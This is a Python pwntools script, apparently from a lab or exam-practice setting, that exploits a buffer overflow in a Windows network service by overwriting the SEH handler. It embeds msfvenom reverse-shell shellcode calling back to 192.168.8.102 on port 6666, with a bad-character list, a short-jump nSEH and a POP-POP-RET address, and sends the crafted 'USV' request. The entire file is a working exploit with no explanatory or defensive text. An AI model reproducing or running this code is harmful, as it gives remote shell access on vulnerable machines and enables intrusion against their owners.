from pwn import *

ip = '192.168.8.110'
port = 6660
badchars = b'\x00\x0a\x0d\x20\x25'
chars = bytes([i for i in range(0x100)])
chars = chars.translate(None,badchars)

# msfvenom -p windows/shell_reverse_tcp -b '\x00\x0a\x0d\x20\x25' exitfunc=thread -f python LHOST=192.168.8.102 LPORT=6666
shellcode =  b""
shellcode += b"\xda\xda\xd9\x74\x24\xf4\x58\xbf\x54\x01\xb1\x43\x33"
shellcode += b"\xc9\xb1\x52\x31\x78\x17\x83\xe8\xfc\x03\x2c\x12\x53"
shellcode += b"\xb6\x30\xfc\x11\x39\xc8\xfd\x75\xb3\x2d\xcc\xb5\xa7"
shellcode += b"\x26\x7f\x06\xa3\x6a\x8c\xed\xe1\x9e\x07\x83\x2d\x91"
shellcode += b"\xa0\x2e\x08\x9c\x31\x02\x68\xbf\xb1\x59\xbd\x1f\x8b"
shellcode += b"\x91\xb0\x5e\xcc\xcc\x39\x32\x85\x9b\xec\xa2\xa2\xd6"
shellcode += b"\x2c\x49\xf8\xf7\x34\xae\x49\xf9\x15\x61\xc1\xa0\xb5"
shellcode += b"\x80\x06\xd9\xff\x9a\x4b\xe4\xb6\x11\xbf\x92\x48\xf3"
shellcode += b"\xf1\x5b\xe6\x3a\x3e\xae\xf6\x7b\xf9\x51\x8d\x75\xf9"
shellcode += b"\xec\x96\x42\x83\x2a\x12\x50\x23\xb8\x84\xbc\xd5\x6d"
shellcode += b"\x52\x37\xd9\xda\x10\x1f\xfe\xdd\xf5\x14\xfa\x56\xf8"
shellcode += b"\xfa\x8a\x2d\xdf\xde\xd7\xf6\x7e\x47\xb2\x59\x7e\x97"
shellcode += b"\x1d\x05\xda\xdc\xb0\x52\x57\xbf\xdc\x97\x5a\x3f\x1d"
shellcode += b"\xb0\xed\x4c\x2f\x1f\x46\xda\x03\xe8\x40\x1d\x63\xc3"
shellcode += b"\x35\xb1\x9a\xec\x45\x98\x58\xb8\x15\xb2\x49\xc1\xfd"
shellcode += b"\x42\x75\x14\x51\x12\xd9\xc7\x12\xc2\x99\xb7\xfa\x08"
shellcode += b"\x16\xe7\x1b\x33\xfc\x80\xb6\xce\x97\x6e\xee\xd8\x01"
shellcode += b"\x07\xed\xd8\xd7\xdd\x78\x3e\x8d\xf1\x2c\xe9\x3a\x6b"
shellcode += b"\x75\x61\xda\x74\xa3\x0c\xdc\xff\x40\xf1\x93\xf7\x2d"
shellcode += b"\xe1\x44\xf8\x7b\x5b\xc2\x07\x56\xf3\x88\x9a\x3d\x03"
shellcode += b"\xc6\x86\xe9\x54\x8f\x79\xe0\x30\x3d\x23\x5a\x26\xbc"
shellcode += b"\xb5\xa5\xe2\x1b\x06\x2b\xeb\xee\x32\x0f\xfb\x36\xba"
shellcode += b"\x0b\xaf\xe6\xed\xc5\x19\x41\x44\xa4\xf3\x1b\x3b\x6e"
shellcode += b"\x93\xda\x77\xb1\xe5\xe2\x5d\x47\x09\x52\x08\x1e\x36"
shellcode += b"\x5b\xdc\x96\x4f\x81\x7c\x58\x9a\x01\x9c\xbb\x0e\x7c"
shellcode += b"\x35\x62\xdb\x3d\x58\x95\x36\x01\x65\x16\xb2\xfa\x92"
shellcode += b"\x06\xb7\xff\xdf\x80\x24\x72\x4f\x65\x4a\x21\x70\xac"

s = remote(ip,port)

payload = b'a'*962
# nSEH, short jmp 6
payload += b'\xeb\x06\x90\x90'
# SEH, pop pop ret
payload += p32(0x0f9f1dc9)
# shellcode
payload += shellcode
payload += b'd'*(2500-len(payload))
buf = b'USV '
buf += payload
buf += b'\r\n\r\n'

s.send(buf)
